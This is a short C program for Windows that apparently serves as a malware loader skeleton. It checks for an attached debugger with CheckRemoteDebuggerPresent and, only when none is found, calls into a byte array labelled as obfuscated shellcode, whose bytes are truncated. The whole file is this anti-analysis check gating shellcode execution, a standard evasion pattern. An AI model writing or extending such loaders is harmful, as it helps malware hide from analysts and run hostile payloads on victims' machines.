#include <windows.h>
#include <stdio.h>

BOOL is_debugged() {
    BOOL debugger_present = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugger_present);
    return debugger_present;
}

void shellcode() {
    unsigned char code[] = "\x90\xfc\xe8..."; // Obfuscated shellcode, truncated for brevity
    __asm {
        call code
    }
}

int main() {
    if (!is_debugged()) {
        shellcode();
    } else {
        printf("Debugger detected, exiting.\n");
    }
    return 0;
}
